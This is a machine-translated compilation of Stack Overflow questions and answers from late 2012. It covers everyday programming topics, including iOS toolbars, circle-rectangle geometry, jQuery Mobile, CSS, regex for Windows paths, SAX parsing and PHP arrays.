        <asp:DropDownList ID="CustomerCountryDropDownList" runat="server">
        </asp:DropDownList>

            <asp:RequiredFieldValidator ID="CustomerCountryRequiredFieldValidator" ControlToValidate="CustomerCountryDropDownList" runat="server" ErrorMessage="RequiredFieldValidator">
            </asp:RequiredFieldValidator>
    </div>
</div> 
```

# ios - 隐藏 UIToolBar 和 UINavigation 并展开 UIWebView？- iOS

> ID：14097289
> 
> 赞同：3
> 
> 时间：2012-12-31T04:02:58.870
> 
> 标签：ios, xcode, uiwebview, hide, uigesturerecognizer

是否可以隐藏 a `UIToolBar`and`UINavigationBar`并用 a 这样做`UITouchGestureRecognizer`但同时展开 the`UIWebView`以占用其余空间？还反过来做同样的事情？

提前感谢大家！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:30:14.377

要隐藏顶部导航栏，请使用`navigationBarHidden`属性或`setNavigationBarHidden:animated:`方法（如果您希望它具有动画效果）。同样，使用底部工具栏的`toolbarHidden`属性或`setToolbarHidden:animated:`方法。这些是`UINavigationController`.

如果您想为工具栏隐藏和`UIWebView`扩展设置动画，请将大小的更改包装`UIWebView`在一个`UIView animateWithDuration...`方法中。

添加您选择的手势识别器。对于滑动，创建一个实例`UISwipeGestureRecognizer`并将其添加到您的视图中。在你的`viewDidLoad`方法中是这样的：

```
UISwipeGestureRecognizer *swipeGestureRecognizer = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(handleSwipe)];
[self.view addGestureRecognizer:swipeGestureRecognizer]; 
```

滑动处理程序如下所示：

```
-(void)handleSwipe{
    if (self.navigationController.navigationBarHidden) {
       [self.navigationController setNavigationBarHidden:NO animated:YES];
        [self.navigationController setToolbarHidden:NO animated:YES];
       [UIView animateWithDuration:0.3 animations:^{
            self.webView.frame = CGRectMake(self.webView.frame.origin.x, self.webView.frame.origin.y, self.webView.frame.size.width, self.webView.frame.size.height - 88);
        }];
    } else {
        [self.navigationController setNavigationBarHidden:YES animated:YES];
        [self.navigationController setToolbarHidden:YES animated:YES];
        [UIView animateWithDuration:0.3 animations:^{
            self.webView.frame = CGRectMake(self.webView.frame.origin.x, self.webView.frame.origin.y, self.webView.frame.size.width, self.webView.frame.size.height + 88);
       }];
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T04:41:36.137

采用

```
-(void)didTap
{
[self.navigationController setNavigationBarHidden:YES animated:YES];
//remove your tool bar from superview
[toolbar removeFromSuperview];
//code to add ur UIWebView

} 
```

# java - 检查圆是否包含矩形

> ID：14097290
> 
> 赞同：4
> 
> 时间：2012-12-31T04:03:07.957
> 
> 标签：java, geometry

如何检查 Circle 是否**完全**包含 Rectangle（在 Java 中）？

```
public class Circle {
   //x and y define the top left corner of the square bounding this circle
   public int x, y, radius;
}

public class Rectangle {
   //x and y define the top left corner
   public int x, y, width, height;
}

public boolean circleContainsRectangle(Circle circle, Rectangle rect) {
   ...
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-31T04:16:47.200

以下是位于左下角的`cartesian`轴的答案。`(0, 0)`

**编辑** 因为你`x, y`是正方形的左上角。将它们转换为居中：

```
x = x+r
y = y-r 
```

圆的方程是`x^2 + y^2 = r^2`，现在给定的点将`{x, y}`在 iff 时位于圆内或圆上`x^ + y^2 <= r^2`。现在，我们可以安全地假设，如果所有四角点都位于圆内或圆上，矩形将位于圆内。使用上述假设伪代码来查找矩形是否包含在圆形中：

```
boolean contains(Circle c) {
    Point p_rect_1 = {x, y};
    Point p_rect_2 = {x + width, y };
    Point p_rect_3 = {x + width, y + height };
    Point p_rect_4 = {x, y + height };
    Point[] points = new Point[] { p_rect_1, p_rect_2, p_rect_3, p_rect_4 };

    foreach(Point p : points) {
        // ** is raise to power
        if ((c.x - p.x)**2 + (c.y - p.y)**2 > c.r**2) {
            return false;
        }
    }
    return true;
} 
```

**编辑** 更优化的计算方法（由 Jim 在下面的评论中建议）将通过计算距圆心最远的矩形角：

```
dx = max(centerX - rectLeft, rectRight - centerX); 
dy = max(centerY - rectTop, rectBottom - centerY);
return radius*radius >= dx*dx + dy*dy 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T04:08:25.470

`radius`可能最简单的方法是检查矩形的所有四个角距圆心的距离是否小于单位。如果是，则矩形中的所有点都在圆内。您必须检查的四个点是 (x, y)、(x + width, y)、(x, y + height) 和 (x + width, y + height)。

注意：奇怪的是圆是从右上角定义的，而矩形是从左上角定义的。确保在计算圆心时考虑到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-01-03T18:33:50.207

斯威夫特 4：

```
func checkCircleContainsRect(circle: Circle, rect: CGRect) -> Bool
    {
        let dx = max(abs(circle.position.x - rect.minX), abs(rect.maxX - circle.position.x))
        let dy = max(abs(circle.position.y - rect.maxY), abs(rect.minY - circle.position.y))
        return (circle.radius * circle.radius) >= (dx * dx) + (dy * dy)
    } 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2020-11-26T07:13:36.503

我知道我迟到了，但我想分享我的想法，如果有什么问题的话。我只是使用 width/2 和 height/2 来定义一半的高度和一半的宽度。接下来我使用勾股定理来计算从中心到角落的距离，然后检查它是否大于半径。我知道它的 java，但我不能在其中编码，但我想用 c++ 制作相同的程序。无论如何这里的代码：

```
#include <iostream>
#include <math.h>

using namespace std;

void rectangle_in_circle(float w, float h,float r){
    //sides of square triangle
    float a;
    float b;
    float c;
    //pythagorean theorem
    b = h/2;
    a = w/2;
    c = sqrt(pow(b,2) + pow(a,2));
    //output
    if(c <= r){
        cout << "true" << endl;
    }else{
        cout << "false" << endl;
    }
    }

int main(){ 

    rectangle_in_circle(4,7,5);
    return 0;
} 
```

# php - SugarCRM 中的化名

> ID：14097296
> 
> 赞同：0
> 
> 时间：2012-12-31T04:04:29.913
> 
> 标签：php, crm, sugarcrm

我正在使用 SugarCRM 为一个政治组织创建会员数据库，但有一个需求我不知道如何处理。

该组织的每个成员都可以使用化名，在这种情况下，他们的真实全名以及其他一些字段是保密的，只能由管理员查看和编辑。

处理这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:33:58.243

我建议使用联系人模块中默认的 first_name、last_name 字段作为名称或化名。然后为真实的名字/姓氏创建几个自定义字段，这些字段仅在化名时使用。如果当前用户是管理员，您需要自定义 view.edit.php 和 view.detail.php (custom/modules/Contacts/views) 以显示真实姓名字段。

# jquery-mobile - 固定页脚上的 Jqm 提交按钮

> ID：14097297
> 
> 赞同：2
> 
> 时间：2012-12-31T04:04:30.143
> 
> 标签：jquery-mobile, footer, css-position

我有一个表单，我想将提交按钮放在固定的页脚栏上。问题是，如果我将页脚放在表单内，它不会固定在底部。如果我将页脚移到表单之外，则提交按钮将不起作用。有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T06:46:52.553

连接页脚按钮的单击事件以提交表单。

```
<a data-role="button" onclick="$('#yourForm').submit();">Save</a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-03T19:18:09.060

一旦你像@andleer 所说的那样在页脚上获得按钮，你可能想在表单中隐藏你的按钮。

由于 jqm '增强'你的代码，你不能做一个简单的 jQuery `hide()`。我想我会在这里提供一种方法来做到这一点，因为我花了一点时间才把它做好。

```
$('#[THE PAGE THAT YOUR FORM IS ON]').on( "pagebeforeshow", function(e) {
    if(e.handled !== true) {
        $('#submit-btn').parent().hide();
        $('#cancel-btn').parent().hide();
        e.handled = true;
    }
}); 
```

作为旁注，`e.handled`这里是为了防止代码根据 jqm 加载脚本和页面的方式多次运行。

# css - 进度条样式

> ID：14097298
> 
> 赞同：0
> 
> 时间：2012-12-31T04:04:38.607
> 
> 标签：css

我正在尝试在 CSS 中制作进度条，但在设置某些组件的样式时遇到了问题。悬停时，我似乎无法让箭头随框改变颜色。

![在此处输入图像描述](../Images/2c0cf3d091e8c5990c2176ae9b180540.png)

这是其中一个按钮的 html

```
 <li>
  <div class="arrow-in"></div>
  <div class="outerContainer done">
      <div class="innerContainer">
          <div class="element"><a href="#">Step 2</a></div>
      </div>
  </div>
  <div class="arrow-right"></div>
  </li> 
```

这是箭头的CSS

```
.arrow-right {
    width: 0;
    height: 0;
    border-top: 30px solid transparent;
    border-bottom: 30px solid transparent;
    border-left: 20px solid #EBEBEB;
    display: inline-block;
    float: left;
}

.arrow-in {
    width: 0;
    height: 0;
    border-top: 30px solid transparent;
    border-bottom: 30px solid transparent;
    border-left: 20px solid #FFF;
    display: inline-block;
    float: left;
    background-color: #EBEBEB;
} 
```

[http://jsfiddle.net/waspinator/sxC8e/](http://jsfiddle.net/waspinator/sxC8e/)

这是实现这种效果的合理方法还是我应该做一些完全不同的事情？

编辑：

我按照建议做了，并在课前和课后使用。

[http://jsfiddle.net/waspinator/tqVjX/](http://jsfiddle.net/waspinator/tqVjX/)

我现在如何将圆圈定位在右侧而不移动文本？

编辑2：

好的另一种方法，但现在我不能得到超过一行的文字

[http://jsfiddle.net/waspinator/fwN7P/8/](http://jsfiddle.net/waspinator/fwN7P/8/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T17:41:23.683

这是一种达到预期效果的方法：

[http://jsfiddle.net/waspinator/fwN7P/11/](http://jsfiddle.net/waspinator/fwN7P/11/)

html

```
<button>
    <a href="">one line</a>
    <i></i>
</button>
<button id="current">
    <a href="">two lines of text</a>
    <i></i>
</button>
<button>
    <a href="">three lines of text in this one </a>
    <i></i>
</button>
<button>
    <a href="">the most extreme case with four lines of text</a>
    <i></i>
</button> 
```

css

```
a{
    text-decoration: none;
    color: black;
}

button {
    background:#ddd;
    border:0;
    font-weight:bold;
    cursor:pointer;
    position:relative;
    padding:0px 50px 0px 15px;
    width: 150px;
    height: 60px;
    font-size: 0.7em;
    vertical-align: top;

}

button:hover{
    background: gray;
}

button:hover:before{
    border-top:30px gray solid;
    border-bottom:30px gray solid;
}

button:hover:after{
    border-left:15px gray solid;
}

#current {
    background: red;
}

#current:before
{
    border-top:30px red solid;
    border-bottom:30px red solid;
}

#current:after
{
    border-left: 15px solid red;
}

#current .element a {
    color: #FFFFFF;
}

button:before {
    content:'';
    border-top:30px #ddd solid;
    border-bottom:30px #ddd solid;
    border-left:15px #fff solid;
    position:absolute;
    top:0;
    left:0;
}
button:after {
    content:'';
    border-top:30px #fff solid;
    border-bottom:30px #fff solid;
    border-left:15px #ddd solid;
    position:absolute;
    top:0;
    right:0;
}
button i:after {
    content:'\2713';
    width:25px;
    color: white;
    height:25px;
    font-size: 20px;
    background: green;
    border-radius: 25px;
    line-height: 25px;
    position:absolute;
    top:0;
    bottom:0;
    margin:auto;
    right:20px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:20:44.390

试试这个 ：

它应该工作

**[Jsbin 演示](http://jsbin.com/uvotad/3/watch)**

# asp.net - ASPX 页面完全被 AjaxControlToolkit 组合脚本取代

> ID：14097300
> 
> 赞同：0
> 
> 时间：2012-12-31T04:04:52.610
> 
> 标签：asp.net, ajaxcontroltoolkit

我遇到了这个奇怪的问题，我有一个包含 AjaxControlToolkit ScriptManager 的 ASPX 页面，并且该 aspx 文件看起来没有问题。但是当我试图从浏览器访问这个特定页面时，它会提示我下载该页面，里面是这样的：

```
//START AjaxControlToolkit.Compat.Timer.Timer.js
///////////////////////////////////////////////////////////////////////
Sys.Timer = function() {
Sys.Timer.initializeBase(this);this._interval = 1000;this._enabled = false;this._timer = null;}
Sys.Timer.prototype = {
get_interval: function() {
return this._interval;},
set_interval: function(value) {
if (this._interval !== value) {
this._interval = value;this.raisePropertyChanged('interval');if (!this.get_isUpdating() && (this._timer !== null)) {
this._stopTimer();this._startTimer();}
}
...
... 
```

我不知道这里发生了什么。它是一个 .Net 3.5 Web 应用程序，除此页面外一切正常。

代码片段：

```
<ajaxToolkit:ToolkitScriptManager runat="Server" ID="ScriptManager1" />

    <script type="text/javascript" language="javascript">
        //...
    </script>

    <asp:Button runat="server" ID="hiddenTargetControlForModalPopup" Style="display: none" />
    <ajaxToolkit:ModalPopupExtender runat="server" ID="proModalPopup" BehaviorID="proModalPopupBehavior"
        TargetControlID="hiddenTargetControlForModalPopup" PopupControlID="proPopup"
        BackgroundCssClass="modalBackground" DropShadow="True" PopupDragHandleControlID="proPopupDragHandle"
        CancelControlID="OkButton" X="200" Y="200" RepositionMode="RepositionOnWindowScroll">
    </ajaxToolkit:ModalPopupExtender> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T07:02:15.453

刚刚得知网页正在通过应用程序请求路由（ARR）并重新启动 ARR 解决了问题，怀疑 ARR 上的缓存应该归咎于。

# android - ActionMode 的位置相关动作与上下文菜单一样

> ID：14097309
> 
> 赞同：0
> 
> 时间：2012-12-31T04:06:48.227
> 
> 标签：android, uri, contextual-action-bar, android-contextmenu, actionmode

在较旧的应用程序中，我通常会使用`onCreateContextMenu()`以下签名进行上下文操作：

```
public void onCreateContextMenu(ContextMenu menu, View v,
                                ContextMenuInfo menuInfo) 
```

这`menuInfo`将为我提供正在构建上下文菜单的列表中的哪个项目的信息。然后我可以有权`Uri`找到适合它的操作并将它们创建为菜单项（使用自动意图或其他方式）。

现在，使用更新的 API，替换它的是上下文操作栏，使用`ActionMode`：

```
public boolean onCreateActionMode(ActionMode mode, Menu menu) 
public boolean onPrepareActionMode(ActionMode mode, Menu menu) 
```

*但是在这里，我如何区分项目和/或获取此位置信息？*

对于批处理模式，不存在这样的参数是有意义的，因为您应该只提供适用于任何事物的操作。但是对于单模式，除了按钮现在在操作栏中之外，*这不完全等同于旧的 API 吗？*

参考：http: [//developer.android.com/guide/topics/ui/menus.html#context-menu](http://developer.android.com/guide/topics/ui/menus.html#context-menu)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:19:13.897

即使对于“批量”选择，您仍然需要找出选择了哪些项目来执行所需的操作。

据我所知，这些回调没有解决“选择了哪些项目”部分，而是留给了开发人员；没有通用的方法来标记项目，一个常见的模式是使用复选框。请注意，列表项的“已选择”状态不应是暂时状态，因为如果您单击要标记的项目为“已选择”，则应在视觉上保持选中状态，以便用户可以了解哪个项目正在研究中。因此，您可以欺骗普通的 ListView 以保持其“选定”状态或使用复选框或类似机制。在这些方法中的任何一种中，无论是一个还是多个选定的项目，您都有您的列表，您可以查询您的列表以获取哪些被选择并对其执行所需的操作。

# eclipse - 如何将 emf 与 eclispe 团队支持进行比较

> ID：14097311
> 
> 赞同：3
> 
> 时间：2012-12-31T04:07:08.807
> 
> 标签：eclipse, compare, emf, emf-compare

我正在使用 Emf Compare 2 与来自 eclipse 的团队支持集成。我按照[此处](http://wiki.eclipse.org/EMF_Compare/FAQ#How_can_I_programmatically_add_my_model_file_extension_in_EMF_Compare_so_that_it_is_called_automatically_.3F)emf compare faq page 的说明进行操作，但内容类型 ID“org.eclipse.emf.compare.ui.contenttype.ModelContentType”似乎不再有效。我尝试的另一种方法是在我的自定义文件扩展名和 org.eclipse.emf.ecore.xmi 之间添加文件类型关联，以便 emf compare 可以获取我的文件并自动进行差异。这样，emf 模型比较编辑器就会出现，但它说没有区别，即使我很确定我对模型做了一些更改。我应该怎么办？

[编辑] 我检查了 emf compare 模块，结果发现 emf compare 只在“比较”菜单中提供了相互比较的选项。2个文件之间的比较正在工作。所以剩下的问题是如何使选项“比较”>“最新来自存储库”与 emf 比较编辑器一起使用

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-02T09:15:46.387

[编辑：这个问题导致[在 EMF 比较中发现一个错误，该错误阻止它与 SVN 存储库一起使用](https://bugs.eclipse.org/bugs/show_bug.cgi?id=397955)。按照计划在 6 月 28 日发布的 Eclipse Kepler (4.3) 版本中进行这项工作。]

（免责声明：我是 EMF Compare 开发团队的一员，他们将解释下面的“我们”和“我们”：p）

您可能已经发现，EMF 比较 wiki 几乎完全过时了：它包含许多仅适用于 EMF 比较 1 的信息*，只有少数部分已更新以适用于 EMF 比较 2*。这在我们的优先事项列表中，但是在我们可以切换到正确更新 wiki 之前，仍然需要修复一些小问题以稳定这个版本。

[编辑：维基现在已经更新了更准确的信息，虽然缺少部分，但不再有任何过时的部分。]

至于你的假设

> emf compare 仅在“比较”菜单中提供相互比较选项

事实上，EMF Compare*不会*为工作台或其菜单提供*任何选项。*我们在较低的层次上集成。“比较”菜单中可用的所有项目均由您正在使用的存储库提供者（CVS、Git、Clearcase...插件）或平台本身提供。

然后，如果内容类型匹配，则从平台调用 EMF Compare，无论您是使用*compare with > each*还是*compare with > latest from repository* ... 或任何其他都无关紧要。

使用 EMF Compare 2，我们还没有重新添加自定义内容类型，但是您可以使用*org.eclipse.emf.ecore.xmi*扩展来获得相同的结果，您已经完成了。

*与存储库中的 > latest 比较*没有显示任何差异意味着我们未能为您的文件检索到正确的“远程”内容。您可以使用显示“EMF 比较”的中心下拉菜单切换回文本比较（从模型比较编辑器）：只需在其中选择“文本比较”。在那里，您应该看到文件之间的文本差异：如果没有，那么我们确实未能检索到正确的远程内容（或者您实际上没有本地文件和远程文件之间的差异）。

如果是这种情况，您的错误日志中是否显示任何内容（*Window > Show View > Error Log*）？你使用什么存储库，CVS？当您完全禁用 EMF 比较时，您的比较实际上是否显示了文件之间的文本差异？

# google-apps-script - 如何删除手动换行符

> ID：14097319
> 
> 赞同：3
> 
> 时间：2012-12-31T04:08:46.157
> 
> 标签：google-apps-script, google-docs, google-forms

我正在从表单中获取数据并写入谷歌文档。它具有姓名、年龄、地址等字段。地址是段落文本类型。我的问题是，在通过提交时触发脚本在 google Doc 中写入数据时，如何删除填写表格的人输入的地址中的手动换行符。即我希望地址是一个连续的字符串，没有填写表格的人在输入他的地址时可能放置的中断。

好的，这里有更多详细信息。我表单中的地址字段称为“地址”，我有一个 onformsubmit 触发脚本，它读取表单中人员输入的所有数据并放入谷歌文档应用程序。我将表格中输入的值读取为：

```
 for(var field in e.namedValues) {
    message += field + ' :: ' + e.namedValues[field].toString().replace("\n",", ") + "\n";
} 
```

但是在我的谷歌文档中，地址 sre 的值的行仍然被打破，而填写表格的人已经打破了这些行。我想消除这些换行符并用逗号替换它，以便地址是连续的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T06:46:52.720

使用替换功能将部分行更改为

e.namedValues[field].toString().replace(/(\r\n|\n|\r)/gm, ", ");

有用！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T04:26:40.167

通过从段落中获取包含文本的字符串并将其传递来删除换行符`string.Replace("\n", "");`如果这不起作用，那么您将需要提供更多详细信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-24T10:17:08.643

您也可以使用范围类：

```
function editRow(r){

    var sheet = SpreadsheetApp.getActiveSheet();

    var relevantRange = sheet.getRange(r, 21, 1, 1);

    artefactRange.setValue(relevantRange.getValue().replace(/(\n)/g, ', '));

} 
```

# cocos2d-iphone - 旋转 CCSprite 那是一个等边三角形

> ID：14097321
> 
> 赞同：1
> 
> 时间：2012-12-31T04:08:59.083
> 
> 标签：cocos2d-iphone, rotation, geometry, ccsprite

我有一个等边三角形的 CCSprite。我想以 60 度的增量旋转三角形以保持其位置。

精灵是 126x110（不是正方形），将精灵旋转属性设置为 60 度增量会改变精灵的位置。我怎样才能让精灵在每次旋转时保持静止？

更多关于这个矩形的中心不是精灵的中心。因此，当需要旋转以使三角形的中心保持居中时，需要进行一些调整。

我想我想出了一个需要批准的长答案..

```
 // collect points.
    self.point1 = CGPointMake(CGRectGetWidth(self.tile.boundingBox)/2, 0);
    self.point2 = CGPointMake(CGRectGetWidth(self.tile.boundingBox), CGRectGetHeight(self.tile.boundingBox));
    self.point3 = CGPointMake(0, CGRectGetHeight(self.tile.boundingBox));

    // calculcate the mid point.
    float midPointX = floor((self.point1.x + self.point2.x + self.point3.x)/3.0);
    float midPointY = floor((self.point1.y + self.point2.y + self.point3.y)/3.0);

   // stash the center of the triangle
    self.triangleCenter = CGPointMake(midPointX, midPointY); 
```

然后根据旋转找出中心点的新位置。并在那里设置动画。（对不起，屏幕中心是硬编码的，这是一个粗略的测试）。

```
-(void) rotateToAngleAboutCenter:(float)angle {

        // stash old values.
        CGPoint oldPosition = self.tile.position;
        float oldRotation = self.tile.rotation;

        // reset the rotation
       self.tile.rotation = 0;

       // this is hard coded here currently the center of the screen.
       self.tile.position =  ccp(512, 384);

       // figure out where our center point will be when we are rotated about the center.
       CGPoint point = ccpRotateByAngle(self.triangleCenter, [self.tile anchorPointInPoints],-CC_DEGREES_TO_RADIANS(angle));

      // convert the ppoint to local space.
      point = [self.tile convertToWorldSpace:point];

      point = [self convertToNodeSpace:point];

      // reset the rotation and position.
      self.tile.rotation = oldRotation;
      self.tile.position = oldPosition;

      // animate to new rotation/position.
      CCMoveTo* moveTo = [CCMoveTo actionWithDuration:.25 position:point];
      CCRotateTo* rotateTo = [CCRotateTo actionWithDuration:.25 angle:angle];

      [self.tile runAction:moveTo];
      [self.tile runAction:rotateTo];
} 
```

# javascript - 替换 Windows '\\' 路径中的文件名

> ID：14097327
> 
> 赞同：1
> 
> 时间：2012-12-31T04:10:24.267
> 
> 标签：javascript, regex, replace

我正在尝试从 C# 中创建的路径中删除文件名（使用 Server.MapPath，默认情况下使用`\\`），例如：

```
C:\\Foo\\Bar\\Baz\\file.js 
```

我当前的正则表达式看起来在[RegExr](http://gskinner.com/RegExr/)中有些工作，但在实际应用程序中它的工作方式正好相反：

```
\/[^\\]+$ 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T04:25:44.070

由于您在 JS 中执行此操作，因此只需执行`String.split`操作。

```
var path = "C:\\Foo\\Bar\\Baz\\file.js";
var separator = "\\";

function getFilenameFromPath(path, separator){
   var segmented = path.split(separator);
   return segmented[segmented.length-1];
}

console.log(getFilename(path, separator)); 
```

# 正则表达式方式...

顺便说一句，你原来的正则表达式唯一的问题是前面的 \ 和缺少的 /

```
 /[^\\]+$/ 
```

会钉它。（`/g`@JDwyers 答案的结尾是使其成为全局匹配，这对您的用例来说是多余的。）

所以...

```
path.match(/[^\\]+$/); // == "file.js" 
```

干杯

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T04:23:46.503

与您的正则表达式保持一致：

```
var s = "C:\\Foo\\Bar\\Baz\\file.js";
var fileName = s.match(/[^​​​​​​\\]+$/​​​​​​​​​​​​g); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T04:34:28.893

由于您想要目录路径，因此通过删除文件名，因此：

```
var path = "C:\\Foo\\Bar\\Baz\\file.js";
var separator = "\\"; // make it OS agnostic.
var result="";

function getFilename(path, separator){
   var segmented = path.split(separator);
   for(var i=0; i<segmented.length-1;i++)
   {
        result+=segmented[i]+"\\\\";
   }
   return result;
}
alert(getFilename(path, separator)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T04:15:23.797

你为什么要为此使用正则表达式？当在类中提供了一个函数来执行此操作时，这是矫枉过正的`Path`：

```
string dirName = Path.GetDirectoryName(filename); 
```

Path 类中也有类似的函数来提取文件名、扩展名、路径根等。

# iphone - CCLabelBMFont 似乎找不到字体文件？

> ID：14097330
> 
> 赞同：1
> 
> 时间：2012-12-31T04:11:04.533
> 
> 标签：iphone, ios, cocos2d-iphone

我正在使用 cocos-builder 创建包含 CCLabelBMFont 的视图，字体在 cocos-builder 中设置正确。但是每次我运行该应用程序时，它都会崩溃，`setFntFlie:`因为它无法找到字体文件。我检查了我的模拟器，它包含`.fnt`和`.png`文件。

有任何想法吗？

* * *

好的，所以我发现问题出在**cocos-builder**上。由于某些奇怪的原因，它无法在包中找到字体文件，但如果我`CCLabelBMFont`直接使用它就可以正常工作。关于为什么 cocos-builder 行为怪异的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:51:59.843

请检查这些文件的成员是否包含在目标中。
1\. 在右侧窗格中选择文件。
2\. 选择目标。

![在此处输入图像描述](../Images/c2a497864891322e156a02c5d5d688b0.png)

# android - 如何解析这种格式的xml？

> ID：14097334
> 
> 赞同：0
> 
> 时间：2012-12-31T04:11:28.610
> 
> 标签：android, xml, sax

我尝试使用 SAX 解析以下格式：

```
<rootxml>
<url src="Jessica%20Alba/46459359.jpg"/>
<url src="Jessica%20Alba/97830837.jpg"/>
<url src="Jessica%20Alba/12062083.jpg"/>
<url src="Jessica%20Alba/10484795.jpg"/>
</rootxml> 
```

通过使用此代码

```
if(localName.equals("url")){

            String source = attributes.getValue("src");
            urls.add(source);
            info.setSRC(source);

        } 
```

但是我没有成功...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:26:26.760

我认为这`code`对你有帮助替换这个而不是上面的代码`XML Parser`

```
if(localName.equals("url")){

            String source = atts.getValue(0);
            urls.add(source);
            info.setSRC(source);

        } 
```

希望这对你有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:16:36.593

```
if(localName.equals("url")){

            String source = attributes.getValue("src");
            urls.add(source);
            info.setSRC(source);

        } 
```

希望这对你有用。没有数据属性，您正在获取数据属性。

# php - 以数字为索引的PHP关联数组

> ID：14097338
> 
> 赞同：0
> 
> 时间：2012-12-31T04:11:56.003
> 
> 标签：php, html, arrays

我有一个表格，有多个选择下拉菜单。我用一个数字给每个人命名。

**问题**
当我对结果进行foreach循环时，我可以获得选定的值，但我**无法**获得密钥？它们以 0 开头，而不是应有的 1。

**HTML：**

```
<select name="1">
    <option value="1">Admin</option>
    <option value="2">Moderator</option>
    <option value="3" selected="selected">User</option>
    <option value="4">More</option>
</select>

<select name="2">
    <option value="1" selected="selected">Admin</option>
    <option value="2">Moderator</option>
    <option value="3">User</option>
    <option value="4">More</option>
</select>

<select name="3">
    <option value="1" selected="selected">Admin</option>
    <option value="2">Moderator</option>
    <option value="3">User</option>
    <option value="4">More</option>
</select> 
```

**表单提交（var_dump）：**

```
array(4) {
  [0]=>
  string(1) "3"
  [1]=>
  string(1) "1"
  [2]=>
  string(1) "1"
} 
```

**PHP**

```
$arr = $form_array;
foreach( $form_array as $key => $value )
{
   echo "The key is: $key <br>";
   echo "The value is: $value <br>";
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:14:30.197

那是因为您的数组是数字索引的。*键*确实是`0`, `1`，*值*分别`2`是, 。_*`3``1``1`*

 *阅读更多关于[PHP 中的数组](http://php.net/manual/en/language.types.array.php)。

根据您的评论，您似乎需要一个选项数组，键控以便您可以将它们与当前数组匹配：

```
array(1 => 'Admin',
  2 => 'Moderator',
  3 => 'User',
  4 => 'More'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:32:24.360

我无法重现这种行为。做一个 $_POST 的 var_dump 我得到的是：

```
array(3) {
  [1]=>
  string(1) "3"
  [2]=>
  string(1) "1"
  [3]=>
  string(1) "1"
} 
```

如果您正在 var_dumping $_POST 并且仍然获得基于 0 的键，那么它一定是特定于版本的 PHP 怪异，我建议改用字符串键（“value1”、“value2”、“value3”等）。如果您正在 var_dumping 一个不同的数组，那么可能是您没有向我们展示的一些代码正在重新索引数组。*

# ruby - 哈希数组 -> 特定值数组

> ID：14097349
> 
> 赞同：0
> 
> 时间：2012-12-31T04:13:39.703
> 
> 标签：ruby

我有一个哈希数组

```
[{"var1"=>"1", "var2" => "123", "var3" => "456" }, {"var1"=>"12", "var2" => "1234", "var3" => "4567"}, {"var1"=>"13", "var2" => "1235", "var3" => "456789"}] 
```

我想得到一组值`var3`

```
["456", "4567", "456789"] 
```

`map(& :var3)`不起作用。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:16:38.933

`map(& :var3)`行不通，因为没有方法`var3`，所以`:var3.to_proc`行不通。做这个：

```
map{|h| h["var3"]} 
```

或者

```
map{|h| h.fetch("var3")} 
```

# android - PhoneGap + jQuery Mobile = 缓慢的点击响应时间

> ID：14097351
> 
> 赞同：17
> 
> 时间：2012-12-31T04:14:29.443
> 
> 标签：android, cordova, jquery-mobile

我知道互联网上有很多这样的问题，但我已经尝试了每一个解决方案（[这个问题](https://stackoverflow.com/questions/13199989/jquery-mobile-button-press-event-slow-to-process)的所有答案），但没有一个有效。

当我在我的 PC 浏览器中运行该站点时，一切都很好，但是一旦我在手机上部署，响应时间就非常滞后。

我尝试过使用 FastClick，将 hoverDelay 设置为 0，并绑定我自己的事件，但结果是一样的。

我使用的是安卓 4.1。除了我尝试过的任何帮助之外，我将不胜感激。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-12-31T04:23:35.220

要加速 JQM，您必须关闭所有转换。

这很糟糕，但 JQM 转换对于移动设备来说太慢了，即使在 iOS 上也是如此。我们只需要等待几年，直到硬件变得更快，我怀疑。尽管 JQM 团队试图在 1.2 中提高性能，但仍然如此。如果我的应用程序感觉迟缓，我仍然无法使用过渡。

我总是使用这些设置来获得 jQuery mobile 的最佳性能。

```
$.mobile.defaultPageTransition   = 'none'
$.mobile.defaultDialogTransition = 'none'
$.mobile.buttonMarkup.hoverDelay = 0 
```

同样，如果您正在编写任何 javascript，**请不要**绑定到任何“点击”事件。Click 在移动设备上太慢了，因为它在触发事件之前有额外的 300 毫秒延迟。

由于您使用的是 JQM，因此您可以改用他们自己的点击事件`vclick`（在后台使用`touchstart`和`touchend`事件）。

如果在那之后它仍然对您来说真的很慢，您可能需要检查点击事件中实际发生的情况 - 也许您的代码没有得到优化。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-15T20:21:12.280

如果您想为移动应用程序解决此问题，最好使用*点击事件而不是点击事件。*

